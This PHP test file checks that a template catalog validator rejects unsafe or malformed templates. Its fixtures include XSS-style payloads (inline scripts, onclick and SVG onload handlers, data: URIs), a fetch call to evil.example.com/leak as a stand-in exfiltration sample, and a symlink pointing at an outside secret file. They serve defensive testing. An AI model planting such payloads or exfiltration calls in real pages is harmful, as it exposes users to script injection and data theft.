<?php

use App\Models\Team;
use App\Services\Templates\TemplateCatalog;

/*
 * Spec 21 mechanism: the catalog loads reviewed template directories and
 * rejects malformed ones in CI, so nothing unreviewed reaches a team. All
 * cases run over a minimal fixture template in tests/Fixtures — the real
 * kanban/wiki/announcements content belongs to the content units.
 */

test('catalog loads the fixture template with its manifest files and seed', function () {
    $catalog = fixtureCatalog(sys_get_temp_dir().'/templates-valid-'.uniqid());

    expect($catalog->keys())->toContain('fixture');

    $template = $catalog->find('fixture');

    expect($template)->not->toBeNull()
        ->and($template->key)->toBe('fixture')
        ->and($template->version)->toBe(3)
        ->and($template->title)->toBe('Fixture board')
        ->and($template->artifactType)->toBe('table')
        ->and($template->entrypoint)->toBe('index.html')
        ->and($template->sharing)->toBe('team')
        ->and($template->editAccess)->toBe('edit')
        ->and($template->requires)->toBe(['artifact-db'])
        ->and($template->files)->toHaveKeys(['index.html', 'app.js', 'app.css', 'SKILL.md'])
        ->and($template->db['collections'])->toBe(['cards' => ['index' => 'column']])
        ->and($template->db['seed'])->toHaveCount(1)
        ->and($template->skill)->toContain('# Fixture skill')
        ->and($catalog->validate('fixture'))->toBe([]);
});

test('catalog rejects malformed templates', function (string $case, Closure $break, string $expected) {
    $dir = sys_get_temp_dir().'/templates-'.$case.'-'.uniqid();
    $catalog = fixtureCatalog($dir);

    $break($dir.'/fixture');

    expect($catalog->validate('fixture'))->not->toBe([])
        ->and(implode("\n", $catalog->validate('fixture')))->toContain($expected)
        ->and($catalog->find('fixture'))->toBeNull();
})->with([
    'inline script' => ['inline-script',
        fn (string $dir) => file_put_contents($dir.'/files/index.html', '<!doctype html><title>x</title><script>alert(1)</script>'),
        'inline `<script>`'],
    'on handler' => ['on-handler',
        fn (string $dir) => file_put_contents($dir.'/files/index.html', '<!doctype html><title>x</title><button onclick="go()">x</button>'),
        '`on*=` handler'],
    'data uri' => ['data-uri',
        fn (string $dir) => file_put_contents($dir.'/files/index.html', '<!doctype html><title>x</title><img src="data:image/png;base64,AAA">'),
        '`data:` URI'],
    'external origin' => ['external-origin',
        fn (string $dir) => file_put_contents($dir.'/files/index.html', '<!doctype html><title>x</title><script src="https://cdn.example.com/app.js"></script>'),
        'external origin'],
    'external stylesheet import' => ['external-import',
        fn (string $dir) => file_put_contents($dir.'/files/app.css', '@import "https://fonts.example.com/f.css";'),
        'external origin'],
    'bad db manifest' => ['bad-db',
        function (string $dir): void {
            $manifest = json_decode((string) file_get_contents($dir.'/template.json'), true);
            $manifest['db'] = ['collections' => ['cards' => []]];
            file_put_contents($dir.'/template.json', (string) json_encode($manifest));
        },
        '`index`'],
    'undeclared seed collection' => ['bad-seed-collection',
        function (string $dir): void {
            $manifest = json_decode((string) file_get_contents($dir.'/template.json'), true);
            $manifest['db']['seed'][] = ['collection' => 'nope', 'doc_id' => 'x', 'body' => ['a' => 1]];
            file_put_contents($dir.'/template.json', (string) json_encode($manifest));
        },
        'undeclared collection'],
    'server-owned field in a seed body' => ['seed-server-field',
        function (string $dir): void {
            $manifest = json_decode((string) file_get_contents($dir.'/template.json'), true);
            $collection = array_key_first($manifest['db']['collections']);
            $manifest['db']['seed'][] = ['collection' => $collection, 'doc_id' => 'stamped', 'body' => ['updated_at' => '2026-11-14T00:00:00Z']];
            file_put_contents($dir.'/template.json', (string) json_encode($manifest));
        },
        'server-owned fields [updated_at]'],
    'missing entrypoint' => ['missing-entrypoint',
        fn (string $dir) => unlink($dir.'/files/index.html'),
        'entrypoint'],
    'missing referenced asset' => ['missing-asset',
        fn (string $dir) => unlink($dir.'/files/app.js'),
        'not in files/'],
    'reserved prefix' => ['reserved-prefix',
        function (string $dir): void {
            mkdir($dir.'/files/__artfct');
            file_put_contents($dir.'/files/__artfct/x.txt', 'x');
        },
        'reserved `__artfct/`'],
    'missing skill' => ['missing-skill',
        fn (string $dir) => unlink($dir.'/skill/SKILL.md'),
        'is missing skill/SKILL.md'],
    'skill mismatch' => ['skill-mismatch',
        fn (string $dir) => file_put_contents($dir.'/files/SKILL.md', 'different text'),
        'byte-identical'],
    'key mismatch' => ['key-mismatch',
        function (string $dir): void {
            $manifest = json_decode((string) file_get_contents($dir.'/template.json'), true);
            $manifest['key'] = 'other';
            file_put_contents($dir.'/template.json', (string) json_encode($manifest));
        },
        'directory name'],
    'unknown requires' => ['unknown-requires',
        function (string $dir): void {
            $manifest = json_decode((string) file_get_contents($dir.'/template.json'), true);
            $manifest['requires'] = ['time-travel'];
            file_put_contents($dir.'/template.json', (string) json_encode($manifest));
        },
        'unknown feature'],
    'inline script with data-src decoy' => ['data-src-script',
        fn (string $dir) => file_put_contents($dir.'/files/index.html', '<!doctype html><title>x</title><script data-src="app.js">alert(1)</script>'),
        'inline `<script>`'],
    'htm inline script' => ['htm-inline-script',
        fn (string $dir) => file_put_contents($dir.'/files/extra.htm', '<!doctype html><script>alert(1)</script>'),
        'inline `<script>`'],
    'svg script element' => ['svg-script',
        fn (string $dir) => file_put_contents($dir.'/files/icon.svg', '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'),
        'SVG `<script>`'],
    'svg foreignObject' => ['svg-foreign-object',
        fn (string $dir) => file_put_contents($dir.'/files/icon.svg', '<svg xmlns="http://www.w3.org/2000/svg"><foreignObject><div>x</div></foreignObject></svg>'),
        'SVG `<foreignObject>`'],
    'svg on handler' => ['svg-on-handler',
        fn (string $dir) => file_put_contents($dir.'/files/icon.svg', '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"></svg>'),
        '`on*=` handler'],
    'svg external href' => ['svg-external',
        fn (string $dir) => file_put_contents($dir.'/files/icon.svg', '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://evil.example.com/x.png"/></svg>'),
        'external origin'],
    'mjs external origin' => ['mjs-external',
        fn (string $dir) => file_put_contents($dir.'/files/mod.mjs', 'fetch("https://evil.example.com/leak");'),
        'external origin'],
    'data uri without semicolon' => ['data-uri-no-semicolon',
        fn (string $dir) => file_put_contents($dir.'/files/index.html', '<!doctype html><title>x</title><iframe src="data:text/html,<script>alert(1)</script>"></iframe>'),
        '`data:` URI'],
    'bare data uri' => ['data-uri-bare',
        fn (string $dir) => file_put_contents($dir.'/files/index.html', '<!doctype html><title>x</title><iframe src="data:,hello"></iframe>'),
        '`data:` URI'],
    'reserved collection session' => ['reserved-collection-session',
        function (string $dir): void {
            $manifest = json_decode((string) file_get_contents($dir.'/template.json'), true);
            $manifest['db'] = ['collections' => ['session' => ['index' => 'title']]];
            file_put_contents($dir.'/template.json', (string) json_encode($manifest));
        },
        'session, batch, or schema'],
    'leading dot collection' => ['leading-dot-collection',
        function (string $dir): void {
            $manifest = json_decode((string) file_get_contents($dir.'/template.json'), true);
            $manifest['db'] = ['collections' => ['.hidden' => ['index' => 'title']]];
            file_put_contents($dir.'/template.json', (string) json_encode($manifest));
        },
        'may not start with a dot'],
]);

test('catalog rejects symlinks inside template files', function () {
    $dir = sys_get_temp_dir().'/templates-symlink-'.uniqid();
    $catalog = fixtureCatalog($dir);
    $outside = sys_get_temp_dir().'/outside-secret-'.uniqid().'.txt';
    file_put_contents($outside, 'secret');

    try {
        symlink($outside, $dir.'/fixture/files/leak.txt');

        expect(implode("\n", $catalog->validate('fixture')))->toContain('symbolic link')
            ->and($catalog->find('fixture'))->toBeNull();
    } finally {
        @unlink($outside);
    }
});

test('catalog rejects an oversized bundle', function () {
    $dir = sys_get_temp_dir().'/templates-oversize-'.uniqid();
    $catalog = fixtureCatalog($dir);

    file_put_contents($dir.'/fixture/files/big.bin', str_repeat('x', TemplateCatalog::MAX_BUNDLE_BYTES));

    expect(implode("\n", $catalog->validate('fixture')))->toContain('bundle limit');
});

test('catalog rejects seed over the cap', function () {
    $dir = sys_get_temp_dir().'/templates-seedcap-'.uniqid();
    $catalog = fixtureCatalog($dir);

    $manifest = json_decode((string) file_get_contents($dir.'/fixture/template.json'), true);
    $manifest['db']['seed'] = [
        ['collection' => 'cards', 'doc_id' => 'big', 'body' => ['blob' => str_repeat('x', TemplateCatalog::MAX_SEED_BYTES)]],
    ];
    file_put_contents($dir.'/fixture/template.json', (string) json_encode($manifest));

    expect(implode("\n", $catalog->validate('fixture')))->toContain('seed cap');
});

test('every shipped template passes the content rules', function () {
    $catalog = TemplateCatalog::default();

    expect($catalog->keys())->toBeArray();

    foreach ($catalog->keys() as $key) {
        expect($catalog->validate($key))->toBe([], "Template [{$key}] must pass the catalog: ".implode('; ', $catalog->validate($key)));
    }
});

test('deploy_artifact refuses a bundle path under the reserved prefix', function () {
    configureArtifactLinks();

    $team = Team::factory()->create();
    $token = remoteMcpToken($team);
    config(['services.worker.base_url' => 'https://worker.test']);

    $response = test()->withToken($token)->postJson('/mcp', [
        'jsonrpc' => '2.0', 'id' => 1, 'method' => 'tools/call',
        'params' => ['name' => 'deploy_artifact', 'arguments' => [
            'files' => [
                ['path' => 'index.html', 'content' => '<!doctype html><title>x</title>'],
                ['path' => '__artfct/db/x.json', 'content' => '{}'],
            ],
            'entrypoint' => 'index.html',
        ]],
    ])->assertOk();

    expect($response->json('result.content.0._meta.artfct.errorCode'))->toBe('invalid_request')
        ->and($response->json('result.content.0.text'))->toContain('reserved');
});
